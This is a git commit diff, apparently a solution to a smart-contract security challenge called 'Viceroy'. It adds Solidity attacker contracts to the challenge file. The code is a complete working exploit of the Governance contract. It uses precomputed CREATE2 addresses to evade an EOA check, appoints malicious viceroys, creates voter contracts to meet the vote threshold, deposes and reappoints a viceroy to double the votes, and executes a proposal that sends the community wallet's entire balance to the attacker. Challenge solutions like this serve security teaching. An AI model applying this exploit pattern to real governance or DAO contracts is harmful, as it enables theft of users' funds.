3ce73da11060fe5f1303a9e331d7537c1d2220f0
George Avsetsin <mail@sjors.ru>
2024-05-03 14:26:51 +0300

    solve Viceroy

--- contracts/Viceroy.sol
+++ contracts/Viceroy.sol
@@ -124,3 +124,120 @@ contract CommunityWallet {
 
     fallback() external payable {}
 }
+
+contract AttackerViceroy {
+    Governance governance;
+
+    constructor(Governance _governance) {
+        governance = _governance;
+    }
+
+    function createProposal(address receiver) external returns (uint256 proposalId) {
+        CommunityWallet wallet = governance.communityWallet();
+
+        bytes memory proposal = abi.encodeWithSignature(
+            "exec(address,bytes,uint256)",
+            receiver,
+            "0x01010101", // any data
+            address(wallet).balance
+        );
+
+        governance.createProposal(msg.sender, proposal);
+        proposalId = uint256(keccak256(proposal));
+    }
+
+    function approveVoter(address voter) external {
+        governance.approveVoter(voter);
+    }
+}
+
+contract AttackerVoter {
+    Governance governance;
+
+    constructor(Governance _governance) {
+        governance = _governance;
+    }
+
+    function voteOnProposal(uint256 proposalId, address viceroy) external {
+        governance.voteOnProposal(proposalId, true, viceroy);
+    }
+}
+
+contract GovernanceAttacker {
+    uint256 TOKEN_ID = 1;
+
+    uint256 proposalId;
+
+    Governance governance;
+    AttackerViceroy viceroy;
+
+    function attack(Governance governance_) external {
+        governance = governance_;
+
+        // 1. Deploy a malicious Viceroy contract with predicted address to avoid EOA check
+        _deployViceroyAndAppointIt(bytes32(0));
+
+        // 2. Create a malicious proposal on behalf of the malicious Viceroy
+        //    The malicious proposal will send all the funds to the attacker
+        _createMaliciousProposal();
+
+        // 3. Create 5 voters and vote on the malicious proposal
+        //    5 is the maximum number of voters that can be appointed by a Viceroy
+        for (uint256 i = 5; i > 0; i--) {
+            _createVoterAndVoteOnProposal(bytes32(i));
+        }
+
+        // 4. Depose the current Viceroy to replace it with the new one
+        _deposeCurrentViceroy();
+
+        // 5. Deploy a new malicious Viceroy and appoint it
+        _deployViceroyAndAppointIt(bytes32(uint256(1)));
+
+        // 6. Create new 5 voters and vote on the malicious proposal
+        //    After this step, the proposal will have 10 votes and cab be executed
+        for (uint256 i = 10; i > 5; i--) {
+            _createVoterAndVoteOnProposal(bytes32(i));
+        }
+
+        // 7. Execute the malicious proposal
+        _executeProposal();
+    }
+
+    function _deployViceroyAndAppointIt(bytes32 salt) internal {
+        bytes memory bytecode = abi.encodePacked(type(AttackerViceroy).creationCode, abi.encode(governance));
+        address viceroyAddress = _predictAddress(salt, bytecode);
+
+        governance.appointViceroy(viceroyAddress, TOKEN_ID);
+
+        viceroy = new AttackerViceroy{salt: salt}(governance);
+        require(address(viceroy) == viceroyAddress, "Error deploying Viceroy");
+    }
+
+    function _createMaliciousProposal() internal {
+        proposalId = viceroy.createProposal(msg.sender);
+        require(proposalId > 0, "Error creating proposal");
+    }
+
+    function _createVoterAndVoteOnProposal(bytes32 salt) internal {
+        bytes memory bytecode = abi.encodePacked(type(AttackerVoter).creationCode, abi.encode(governance));
+        address voterAddress = _predictAddress(salt, bytecode);
+
+        viceroy.approveVoter(voterAddress);
+        AttackerVoter voter = new AttackerVoter{salt: salt}(governance);
+
+        voter.voteOnProposal(proposalId, address(viceroy));
+    }
+
+    function _deposeCurrentViceroy() internal {
+        governance.deposeViceroy(address(viceroy), TOKEN_ID);
+    }
+
+    function _executeProposal() internal {
+        governance.executeProposal(proposalId);
+    }
+
+    function _predictAddress(bytes32 salt, bytes memory bytecode) internal returns (address) {
+        return
+            address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode))))));
+    }
+}
